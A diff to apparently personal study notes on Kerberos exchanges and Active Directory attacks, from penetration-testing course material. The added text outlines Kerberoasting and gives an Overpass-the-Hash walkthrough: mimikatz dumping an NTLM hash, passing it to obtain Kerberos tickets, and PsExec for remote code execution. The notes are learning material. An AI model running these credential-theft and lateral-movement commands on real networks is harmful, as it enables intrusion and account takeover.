@@ -1971,7 +1971,7 @@ TODO the reason
     #+end_quote
 
 
-**** steps: The Authentication Service (AS) Exchange (RFC 4120::3.1)
+**** steps: The Authentication Service (AS) Exchange (RFC 4120::3.1) (user get the TGT)
 
   | Message direction  | Message type            |
   |--------------------+-------------------------|
@@ -2001,7 +2001,7 @@ TODO the reason
       + manually changed (compromise recovery)
     - the ticket is ASN.1 encoded? tool::OpenSSL
     
-**** steps: The Ticket-Granting Service (TGS) Exchange
+**** steps: The Ticket-Granting Service (TGS) Exchange (user get a TGS)
 
   | Message direction  | Message type             |
   |--------------------+--------------------------|
@@ -2046,7 +2046,7 @@ TODO the reason
 
     - When the TGS Exchange is complete, the client should have both a session key and a service ticket. Then the service authentication begins.
 
-**** steps: The Client/Server (CS) Authentication Exchange (RFC4120::3.2)
+**** steps: The Client/Server (CS) Authentication Exchange (RFC4120::3.2) (user use a TGS)
 
 | Message direction              | Message type            |
 | ------------------------------ | ----------------------- |
@@ -2152,9 +2152,9 @@ klist
      + docs:
        - [[https://github.com/nidem/kerberoast]]
 
-     + info: 
-       - kerberoast package.
+     + about: 
        - Enumerate SPNs(LDAP) -> request TGSs -> crack weak passwords(espically rc4-hmac) offline -> ?
+       - there is a kerberoast package.
        //TODO
     
      + src:
@@ -2185,19 +2185,52 @@ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt <TGS ticketFile>
     This method works for Active Directory domain accounts and the built-in local administrator account. Since the 2014 security update, this technique can not be used to authenticate as any other local admin account. 
     #+end_quote
 
-*** Overpass the Hash
+*** Overpass the Hash (access resources with NTLM hash, convert NTLM to TGT, remote code execution with TGT)
     + docs 
       - [[https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf]] 
     + win 10 will temporarily cache credentials after an successful UAC (e.g. run as Administrator -> Run as different user).
-    + src:
+    + src: ## pass the ntlm hash
     #+begin_src powershell
-    ...
     mimikatz # sekurlsa::logonpasswords
-      ## \* NTLM : e2b475c11da2a0748290d87aa966c327
-    mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d 87aa966c327 /run:PowerShell.exe 
-      ## the domain is Kerberos domain?
+    /**
+     * result: 
+     * \* NTLM : e2b475c11da2a0748290d87aa966c327
+     */
+
+    mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe 
+    /**
+     * the /ntlm:<hash>: logon as the user using the NTLM hash
+     * the domain is Kerberos domain?
+     */
+    
+    PS C:\Windows\system32> klist 
+    /**
+    * display cached Kerberos tickets for the current user
+    * (no ticket right now)
+    */
+
+    net use [e:] \\financial\letters\User2
+    /**
+     * could be any command that requires domain permissions and would subsequently create a TGS.
+     * net use [{<DeviceName> | *}] [\\<ComputerName>\<ShareName>[\<volume>]]
+     * more on MS doc
+     */
+
+    PS C:\Windows\system32> klist 
+    /**
+    * 2 tickets, TGT + TGS for the CIFS service
+    */
+
+    PS C:\Tools\active_directory> .\PsExec.exe \\financial cmd.exe
+    /**
+    * reuse the TGT to gain code execution. 
+    * PsExec is an MS official tool that can run a command remotely but does not accept password hashes.
+    */
+
     (PWK p659)
     #+end_src 
+
+*** Pass the Ticket
       
 
 * TODO list
